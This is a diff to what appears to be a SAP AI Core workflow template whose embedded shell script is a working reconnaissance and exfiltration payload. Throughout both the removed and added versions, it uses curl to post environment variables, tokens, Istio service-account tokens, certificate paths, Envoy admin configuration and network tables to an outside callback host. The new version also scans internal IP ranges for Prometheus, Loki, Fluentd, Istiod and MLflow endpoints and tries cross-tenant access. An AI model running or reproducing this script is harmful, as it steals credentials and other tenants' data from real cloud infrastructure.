@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "3.0.0"
+    ai.sap.com/version: "4.0.0"
 spec:
   entrypoint: main
   templates:
@@ -25,100 +25,101 @@ spec:
       - -c
       - |
         CB="https://www.masonhck.tech/cb.php"
-        post() { curl -k -s -X POST "$CB?src=$1" -d @- ; }
-        get() { curl -k -s "$CB?src=$1" ; }
-        # Send data in chunks (callback truncates at ~300 chars)
-        chunk_send() {
-          local tag="$1"
-          local data="$2"
-          local chunk_size=250
+        post() { curl -k -s -X POST "$CB?src=$1" --max-time 5 -d @- ; }
+        get() { curl -k -s "$CB?src=$1" --max-time 5 ; }
+        # Chunked send - 700 byte chunks
+        csend() {
+          local tag="$1" file="$2"
           local i=0
-          echo "$data" | fold -w $chunk_size | while read line; do
-            echo "$line" | post "${tag}-chunk${i}"
+          split -b 700 "$file" /tmp/chunk_
+          for c in /tmp/chunk_*; do
+            cat "$c" | post "${tag}-${i}"
             i=$((i+1))
+            rm -f "$c"
           done
         }
 
-        get "recon3-start-$(hostname)"
+        get "recon4-start-$(hostname)"
 
-        # === 1. Envoy /clusters - lists ALL upstream services with IPs ===
-        CLUSTERS=$(curl -k -s "http://127.0.0.1:15000/clusters" 2>&1)
-        echo "$CLUSTERS" | head -c 800 | post "recon3-clusters-1"
-        echo "$CLUSTERS" | tail -c +801 | head -c 800 | post "recon3-clusters-2"
-        echo "$CLUSTERS" | tail -c +1601 | head -c 800 | post "recon3-clusters-3"
-        echo "$CLUSTERS" | tail -c +2401 | head -c 800 | post "recon3-clusters-4"
-        echo "$CLUSTERS" | tail -c +3201 | head -c 800 | post "recon3-clusters-5"
-        echo "$CLUSTERS" | tail -c +4001 | head -c 800 | post "recon3-clusters-6"
-        echo "$CLUSTERS" | tail -c +4801 | head -c 800 | post "recon3-clusters-7"
-        echo "$CLUSTERS" | tail -c +5601 | head -c 800 | post "recon3-clusters-8"
-        echo "$CLUSTERS" | tail -c +6401 | head -c 800 | post "recon3-clusters-9"
-        echo "$CLUSTERS" | tail -c +7201 | head -c 800 | post "recon3-clusters-10"
-        echo "$CLUSTERS" | wc -c | post "recon3-clusters-size"
+        # === 1. MLflow tracking service with Bearer token ===
+        # The tracking service said "Token Format Is Wrong" - try with our XSUAA JWT
+        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
 
-        # === 2. Envoy /listeners - network rules ===
-        LISTENERS=$(curl -k -s "http://127.0.0.1:15000/listeners" 2>&1)
-        echo "$LISTENERS" | head -c 800 | post "recon3-listeners-1"
-        echo "$LISTENERS" | tail -c +801 | head -c 800 | post "recon3-listeners-2"
-        echo "$LISTENERS" | tail -c +1601 | head -c 800 | post "recon3-listeners-3"
+        # Try different auth formats
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "Authorization: Bearer ${AICORE_TRACKING_TOKEN:-none}" 2>&1 | head -c 700 | post "recon4-track-bearer"
 
-        # === 3. Envoy /server_info - version and config ===
-        curl -k -s "http://127.0.0.1:15000/server_info" 2>&1 | head -c 800 | post "recon3-server-info"
+        # Check if there's a tracking token in env
+        env | grep -i track | post "recon4-track-env"
+        env | grep -i token | post "recon4-token-env"
 
-        # === 4. Full env dump in chunks ===
-        ENVDATA=$(env | sort)
-        echo "$ENVDATA" | head -c 800 | post "recon3-env-1"
-        echo "$ENVDATA" | tail -c +801 | head -c 800 | post "recon3-env-2"
-        echo "$ENVDATA" | tail -c +1601 | head -c 800 | post "recon3-env-3"
+        # Try with internal service mesh auth (Istio mTLS might auto-auth)
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "X-Forwarded-For: 127.0.0.1" 2>&1 | head -c 700 | post "recon4-track-internal"
 
-        # === 5. Probe ml-tracking-service directly ===
-        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 800 | post "recon3-tracking-root"
-        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 800 | post "recon3-tracking-experiments"
-        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0","1","2","3","4","5"]}' 2>&1 | head -c 800 | post "recon3-tracking-runs-1"
-        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0","1","2","3","4","5"]}' 2>&1 | tail -c +801 | head -c 800 | post "recon3-tracking-runs-2"
-        # Try with AI-Main-Tenant header for OTHER tenant
-        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" -H "AI-Main-Tenant: default" 2>&1 | head -c 800 | post "recon3-tracking-other-tenant"
+        # Try health/info endpoints (often unauthed)
+        curl -k -s --connect-timeout 5 "${TRACK}/health" 2>&1 | head -c 700 | post "recon4-track-health"
+        curl -k -s --connect-timeout 5 "${TRACK}/version" 2>&1 | head -c 700 | post "recon4-track-version"
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/registered-models/list" 2>&1 | head -c 700 | post "recon4-track-models"
 
-        # === 6. Envoy config_dump clusters section (service discovery) ===
-        CONFIG=$(curl -k -s "http://127.0.0.1:15000/config_dump?resource=dynamic_active_clusters" 2>&1)
-        echo "$CONFIG" | head -c 800 | post "recon3-dynamic-clusters-1"
-        echo "$CONFIG" | tail -c +801 | head -c 800 | post "recon3-dynamic-clusters-2"
-        echo "$CONFIG" | tail -c +1601 | head -c 800 | post "recon3-dynamic-clusters-3"
-        echo "$CONFIG" | tail -c +2401 | head -c 800 | post "recon3-dynamic-clusters-4"
-        echo "$CONFIG" | tail -c +3201 | head -c 800 | post "recon3-dynamic-clusters-5"
-        echo "$CONFIG" | tail -c +4001 | head -c 800 | post "recon3-dynamic-clusters-6"
-        echo "$CONFIG" | tail -c +4801 | head -c 800 | post "recon3-dynamic-clusters-7"
-        echo "$CONFIG" | tail -c +5601 | head -c 800 | post "recon3-dynamic-clusters-8"
+        # === 2. Prometheus - cross-tenant metrics ===
+        for prom_ip in 100.64.52.26 100.64.26.21; do
+          # Try standard Prometheus endpoints
+          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/api/v1/targets" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-targets"
+          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/api/v1/label/__name__/values" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-metrics"
+          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/api/v1/query?query=up" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-up"
+          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/-/healthy" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-health"
+        done
 
-        # === 7. Try Envoy /stats to see mesh traffic ===
-        curl -k -s "http://127.0.0.1:15000/stats" 2>&1 | grep "cluster\." | head -c 800 | post "recon3-stats-clusters"
+        # === 3. Fluentd/Fluentbit - cross-tenant logs ===
+        # Fluentd forward protocol on 24224
+        curl -k -s --connect-timeout 3 "http://100.64.67.165:24224/" 2>&1 | head -c 700 | post "recon4-fluentd-root"
+        # Fluentbit metrics
+        curl -k -s --connect-timeout 3 "http://100.64.67.165:2020/api/v1/metrics" 2>&1 | head -c 700 | post "recon4-fluentbit-metrics"
+        curl -k -s --connect-timeout 3 "http://100.64.67.165:2020/api/v1/health" 2>&1 | head -c 700 | post "recon4-fluentbit-health"
 
-        # === 8. Istiod direct access (control plane) ===
-        # Try common Istiod ports
-        curl -k -s --connect-timeout 3 "https://istiod.istio-system.svc.cluster.local:15012/debug/endpointz" 2>&1 | head -c 800 | post "recon3-istiod-endpoints"
-        curl -k -s --connect-timeout 3 "https://istiod.istio-system.svc.cluster.local:15014/debug/configz" 2>&1 | head -c 800 | post "recon3-istiod-config"
+        # === 4. OpenTelemetry collector ===
+        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/" 2>&1 | head -c 700 | post "recon4-otel-health"
+        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/pipelinez" 2>&1 | head -c 700 | post "recon4-otel-pipelines"
 
-        # === 9. Mount info (full) ===
-        cat /proc/self/mountinfo 2>/dev/null | head -c 800 | post "recon3-mounts-1"
-        cat /proc/self/mountinfo 2>/dev/null | tail -c +801 | head -c 800 | post "recon3-mounts-2"
+        # === 5. Unknown services from listeners ===
+        curl -k -s --connect-timeout 3 "http://100.109.106.4:8042/" 2>&1 | head -c 700 | post "recon4-svc-8042"
+        curl -k -s --connect-timeout 3 "http://100.110.1.63:8888/" 2>&1 | head -c 700 | post "recon4-svc-8888a"
+        curl -k -s --connect-timeout 3 "http://100.104.178.234:8888/" 2>&1 | head -c 700 | post "recon4-svc-8888b"
+        curl -k -s --connect-timeout 3 "http://100.109.200.238:8888/" 2>&1 | head -c 700 | post "recon4-svc-8888c"
+        curl -k -s --connect-timeout 3 "http://100.104.7.43:20003/" 2>&1 | head -c 700 | post "recon4-svc-20003"
+        curl -k -s --connect-timeout 3 "https://100.109.247.160:443/" 2>&1 | head -c 700 | post "recon4-svc-443"
 
-        # === 10. /proc/net/tcp decoded ===
-        cat /proc/net/tcp 2>/dev/null | head -c 800 | post "recon3-tcp-1"
-        cat /proc/net/tcp6 2>/dev/null | head -c 800 | post "recon3-tcp6-1"
+        # === 6. Istiod control plane ===
+        curl -k -s --connect-timeout 3 "https://100.106.20.244:15012/debug/endpointz" 2>&1 | head -c 700 | post "recon4-istiod-endpoints"
+        curl -k -s --connect-timeout 3 "https://100.106.20.244:15012/debug/configz" 2>&1 | head -c 700 | post "recon4-istiod-config"
+        curl -k -s --connect-timeout 3 "http://100.106.20.244:15014/debug/endpointz" 2>&1 | head -c 700 | post "recon4-istiod-http-endpoints"
+        curl -k -s --connect-timeout 3 "http://100.106.20.244:8080/debug/endpointz" 2>&1 | head -c 700 | post "recon4-istiod-8080-endpoints"
 
-        # === 11. Check for Istio token/certs (used for mTLS) ===
-        ls -la /var/run/secrets/istio/ 2>/dev/null | post "recon3-istio-secrets"
-        ls -la /var/run/secrets/tokens/ 2>/dev/null | post "recon3-istio-tokens"
-        find /var/run/secrets/ -type f 2>/dev/null | head -20 | post "recon3-all-secrets"
-        # Istio stores certs in /etc/certs or /var/run/secrets/istio.io
-        ls -la /etc/certs/ 2>/dev/null | post "recon3-istio-certs"
-        find /etc/istio/ -type f 2>/dev/null | head -20 | post "recon3-istio-etc"
+        # === 7. Envoy clusters - grep for service names ===
+        curl -k -s "http://127.0.0.1:15000/clusters" 2>&1 | grep -oE 'outbound\|[0-9]+\|[^|]*\|[^:]+' | sort -u | head -c 2000 | post "recon4-cluster-names-1"
+        curl -k -s "http://127.0.0.1:15000/clusters" 2>&1 | grep -oE 'outbound\|[0-9]+\|[^|]*\|[^:]+' | sort -u | tail -c +2001 | head -c 2000 | post "recon4-cluster-names-2"
 
-        # === 12. Try quitquitquit on Istio sidecar (if works = sidecar control) ===
-        # DON'T actually quit - just check if endpoint exists
-        curl -k -s --connect-timeout 2 "http://127.0.0.1:15020/healthz/ready" 2>&1 | post "recon3-istio-health"
-        curl -k -s --connect-timeout 2 "http://127.0.0.1:15000/help" 2>&1 | head -c 800 | post "recon3-envoy-help"
+        # === 8. Envoy routes - what paths are configured ===
+        curl -k -s "http://127.0.0.1:15000/config_dump?resource=dynamic_route_configs" 2>&1 > /tmp/routes.json
+        wc -c /tmp/routes.json | post "recon4-routes-size"
+        head -c 700 /tmp/routes.json | post "recon4-routes-1"
+        tail -c +701 /tmp/routes.json | head -c 700 | post "recon4-routes-2"
+        tail -c +1401 /tmp/routes.json | head -c 700 | post "recon4-routes-3"
 
-        get "recon3-done-$(hostname)"
+        # === 9. Check for Istio cert/token files ===
+        find / -path "*/istio*" -type f 2>/dev/null | head -30 | post "recon4-istio-files"
+        find / -name "root-cert.pem" -o -name "cert-chain.pem" -o -name "key.pem" 2>/dev/null | post "recon4-istio-cert-paths"
+        # Try reading Istio proxy token
+        cat /var/run/secrets/tokens/istio-token 2>/dev/null | head -c 700 | post "recon4-istio-token"
+
+        # === 10. Broader scan for Grafana Loki (different IPs) ===
+        for ip in 100.64.52.26 100.64.26.21 100.64.56.14 100.64.58.80 100.64.67.13 100.64.67.165; do
+          curl -k -s --connect-timeout 2 "http://${ip}:3100/config" 2>&1 | head -c 700 | post "recon4-loki-${ip}"
+          curl -k -s --connect-timeout 2 "http://${ip}:3100/ready" 2>&1 | head -c 700 | post "recon4-loki-ready-${ip}"
+        done
+
+        get "recon4-done-$(hostname)"
       resources:
         limits:
           cpu: "1"
